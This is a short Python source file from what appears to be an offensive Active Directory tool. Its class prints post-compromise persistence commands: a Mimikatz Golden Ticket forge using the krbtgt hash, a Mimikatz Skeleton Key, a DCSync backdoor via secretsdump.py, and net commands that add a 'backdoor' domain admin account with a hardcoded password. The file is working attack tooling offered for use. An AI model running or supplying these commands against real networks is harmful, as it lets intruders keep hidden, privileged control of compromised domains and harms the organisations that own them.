"""Persistence suggestions engine."""
class PersistenceEngine:
    def __init__(self, console=None):
        self.console = console

    def suggest(self, da_creds: list, domain_data: dict):
        _p = (lambda m: self.console.print(m)) if self.console else print
        _p("[bold red]𓂀 Persistence Mechanisms[/bold red]")
        suggestions = [
            ("Golden Ticket",  "mimikatz # kerberos::golden /domain:DOMAIN /sid:SID /krbtgt:HASH /user:Administrator"),
            ("Skeleton Key",   "mimikatz # misc::skeleton"),
            ("DCSync Backdoor","Add user to Domain Admins → secretsdump.py"),
            ("Admin Account",  "net user backdoor P@ssword123 /add /domain && net group \"Domain Admins\" backdoor /add /domain"),
        ]
        for name, cmd in suggestions:
            _p(f"  [yellow]• {name}[/yellow]")
            _p(f"    [green]{cmd}[/green]")
